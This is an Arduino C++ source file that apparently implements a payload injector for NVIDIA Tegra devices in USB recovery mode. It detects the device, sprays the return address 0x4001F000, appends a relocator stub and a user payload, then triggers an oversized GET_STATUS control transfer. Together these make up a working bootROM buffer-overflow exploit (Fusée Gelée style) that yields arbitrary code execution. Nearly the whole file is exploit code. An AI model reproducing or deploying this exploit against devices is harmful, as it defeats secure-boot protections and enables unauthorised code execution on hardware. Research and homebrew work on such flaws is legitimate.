#include <Usb.h>
#include "intermezzo_lz4.h"

#define PACKET_CHUNK_SIZE 0x1000
#define PADDING_SIZE ((0x1000 - (INTERMEZZO_SIZE + 4)) / 4)

USBHost usb;
EpInfo epInfo[3];

byte usbWriteBuffer[PACKET_CHUNK_SIZE] = {0};
uint32_t usbWriteBufferUsed = 0;
uint32_t packetsWritten = 0;

bool foundTegra = false;
byte tegraDeviceAddress = -1;

unsigned long lastCheckTime = 0;

// From what I can tell, usb.outTransfer is completely broken for transfers larger than 64 bytes (even if maxPktSize is
// adjusted for that endpoint). This is a minimal and simplified reimplementation specific to our use cases that fixes
// that bug and is based on the code of USBHost::outTransfer, USBHost::SetPipeAddress and USBHost::OutTransfer.
void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* data)
{
  EpInfo* epInfo = usb.getEpInfoEntry(addr, ep);

  usb_pipe_table[epInfo->epAddr].HostDescBank[0].CTRL_PIPE.bit.PDADDR = addr;

  if (epInfo->bmSndToggle)
    USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
  else
    USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;

  UHD_Pipe_Write(epInfo->epAddr, PACKET_CHUNK_SIZE, data);
  uint32_t rcode = usb.dispatchPkt(tokOUT, epInfo->epAddr, 15);
  if (rcode)
  {
    if (rcode == USB_ERROR_DATATOGGLE)
    {
      epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
      if (epInfo->bmSndToggle)
        USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
      else
        USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;
    }
    else
    {
      //setLedColor("red"); //add error code and stop execution
      return;
    }
  }
  epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
}

void usbFlushBuffer()
{
  usbOutTransferChunk(tegraDeviceAddress, 0x01, PACKET_CHUNK_SIZE, usbWriteBuffer);

  memset(usbWriteBuffer, 0, PACKET_CHUNK_SIZE);
  usbWriteBufferUsed = 0;
  packetsWritten++;
}

// This accepts arbitrary sized USB writes and will automatically chunk them into writes of size 0x1000 and increment
// packetsWritten every time a chunk is written out.
void usbBufferedWrite(const byte *data, uint32_t length)
{
  while (usbWriteBufferUsed + length >= PACKET_CHUNK_SIZE)
  {
    uint32_t bytesToWrite = min(PACKET_CHUNK_SIZE - usbWriteBufferUsed, length);
    memcpy(usbWriteBuffer + usbWriteBufferUsed, data, bytesToWrite);
    usbWriteBufferUsed += bytesToWrite;
    usbFlushBuffer();
    data += bytesToWrite;
    length -= bytesToWrite;
  }

  if (length > 0)
  {
    memcpy(usbWriteBuffer + usbWriteBufferUsed, data, length);
    usbWriteBufferUsed += length;
  }
}

inline void usbBufferedWriteU32(uint32_t data)
{
  usbBufferedWrite((byte *)&data, 4);
}

void readTegraDeviceID(byte *deviceID)
{
  byte readLength = 16;
  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);

  if (usb.inTransfer(tegraDeviceAddress, 0x01, &readLength, deviceID))
    return; //false; //add breakpoint
}

void sendPayload(const byte *payload, uint32_t payloadLength, int32_t payloadSlot)
{

  usbBufferedWriteU32(0x30298);
  for( int i = 0; i < 0xA9; i++)
    usbBufferedWriteU32(0);

  for (uint32_t i = 0; i < 0x3C00; i++)
    usbBufferedWriteU32(0x4001F000);

  usbBufferedWrite(intermezzo, INTERMEZZO_SIZE);
  usbBufferedWriteU32(payloadLength+4);
  for(int i = 0; i < PADDING_SIZE; i++)
    usbBufferedWriteU32(0);
  usbBufferedWrite(payload, payloadLength);
  
  uint32_t compressed_slot_nums[9]= {0xFF100000, 0x00100000, 0x01100000, 0x02100000, 0x03100000, 0x04100000, 0x05100000, 0x06100000, 0x07100000};
  uint32_t selected;
  if(payloadSlot > 0 && payloadSlot < 9)
  {
    selected = compressed_slot_nums[payloadSlot];
  }
  else
  {
    selected = compressed_slot_nums[0];
  }

  usbBufferedWriteU32(selected);

  usbFlushBuffer();

  if (packetsWritten % 2 != 1)
  {
    usbFlushBuffer();
  }
}

void findTegraDevice(UsbDeviceDefinition *pdev)
{
  uint32_t address = pdev->address.devAddress;
  USB_DEVICE_DESCRIPTOR deviceDescriptor;
  if (usb.getDevDescr(address, 0, 0x12, (uint8_t *)&deviceDescriptor))
  {
    return; //false; //add breakpoint
  }

  if (deviceDescriptor.idVendor == 0x0955 && deviceDescriptor.idProduct == 0x7321)
  {
    tegraDeviceAddress = address;
    foundTegra = true;
  }
}

boolean searchTegraDevice()
{
  usb.Task();
  usb.ForEachUsbDevice(&findTegraDevice);  
  return foundTegra;
}

int usbInit()
{
   return usb.Init();
}

void setupTegraDevice()
{
  epInfo[0].epAddr = 0;
  epInfo[0].maxPktSize = 0x40;
  epInfo[0].epAttribs = USB_TRANSFER_TYPE_CONTROL;
  epInfo[0].bmNakPower = USB_NAK_MAX_POWER;
  epInfo[0].bmSndToggle = 0;
  epInfo[0].bmRcvToggle = 0;

  epInfo[1].epAddr = 0x01;
  epInfo[1].maxPktSize = 0x40;
  epInfo[1].epAttribs = USB_TRANSFER_TYPE_BULK;
  epInfo[1].bmNakPower = USB_NAK_MAX_POWER;
  epInfo[1].bmSndToggle = 0;
  epInfo[1].bmRcvToggle = 0;

  usb.setEpInfoEntry(tegraDeviceAddress, 2, epInfo);
  usb.setConf(tegraDeviceAddress, 0, 0);
  usb.Task();

  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);

  byte deviceID[16] = {0};
  readTegraDeviceID(deviceID);

  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_OUT, 0x40, 0, USB_HOST_NB_BK_1);
  packetsWritten = 0;
}

void launchPayload()
{
  usb.ctrlReq(tegraDeviceAddress, 0, USB_SETUP_DEVICE_TO_HOST | USB_SETUP_TYPE_STANDARD | USB_SETUP_RECIPIENT_INTERFACE,
              0x00, 0x00, 0x00, 0x00, 0x7000, 0x7000, usbWriteBuffer, NULL);
}
